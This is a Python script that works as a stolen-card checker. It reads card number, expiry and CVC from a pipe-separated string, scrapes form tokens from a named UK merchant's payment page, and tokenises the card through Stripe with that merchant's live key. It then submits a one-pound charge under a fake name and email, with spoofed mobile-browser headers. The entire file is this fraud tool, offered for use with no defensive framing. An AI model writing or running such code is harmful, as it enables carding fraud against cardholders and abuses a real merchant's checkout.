import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'crownguardians.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'if-modified-since': 'Thu, 01 May 2025 15:11:53 GMT',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	            'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	 }
	        
	response = requests.get('https://crownguardians.co.uk/payment', headers=headers)
	        
	r = response.text
	xid = re.search(r'name="XID" value="(.*?)"/>', r)
	xid = xid.group(1)
	p = re.search(r'name="P" value="(.*?)"/>', r)
	p = p.group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	        
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F1cb064bd1e%3B+stripe-js-v3%2F1cb064bd1e%3B+card-element&key=pk_live_OUVwqtzyMwDDyB0lkOcoZ9lX'
	        
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	        
	pm = response.json()['id']
	        
	headers = {
	    'authority': 'crownguardians.co.uk',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://crownguardians.co.uk',
	    'referer': 'https://crownguardians.co.uk/payment',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	        
	params = {
	    'ACT': '24',
	}
	        
	data = {
	    'XID': xid,
	    'ret': 'payment%2Fcomplete',
	    'ret_error': 'https%3A%2F%2Fcrownguardians.co.uk%2Fpayment',
	    'P': p,
	    'customer_name': 'Rodam User',
	    'customer_email': 'rodamuser08@gmail.com',
	    'plan_amount': '1',
	    'meta:reference': 'Coach',
	    'meta:invoice': '1',
	    'card_token': pm,
	}
	        
	response = requests.post('https://crownguardians.co.uk/', params=params, headers=headers, data=data)
	
	return (response.json())
